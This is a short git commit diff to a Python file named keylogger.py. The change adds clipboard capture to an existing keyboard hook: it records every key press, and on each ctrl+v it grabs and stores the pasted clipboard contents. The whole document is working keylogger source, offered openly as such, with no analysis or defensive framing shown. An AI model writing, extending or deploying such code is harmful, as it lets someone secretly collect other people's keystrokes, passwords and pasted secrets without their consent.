9d5563fb9a0d78a5f22cbb25f442d1a8a29b6106
Marcin Szachun <mszachun@gmail.com>
2016-11-27 18:36:51 +0100

    Capture what is being pasted by user

--- keylogger.py
+++ keylogger.py
@@ -3,10 +3,18 @@ import keyboard
 class Keylogger(object):
     def __init__(self):
         self.captured_keys = []
+        self.captured_pasting = []
+
         keyboard.hook(self._on_key_press)
+        keyboard.add_hotkey('ctrl+v', self._on_paste)
 
     def _on_key_press(self, event):
         self.captured_keys.append(event.name)
 
+    def _on_paste(self):
+        import pyperclip # Doesn't work when imported globally
+        self.captured_pasting.append(pyperclip.paste())
 
+
+k = Keylogger()
 raw_input("Press Enter to continue...")
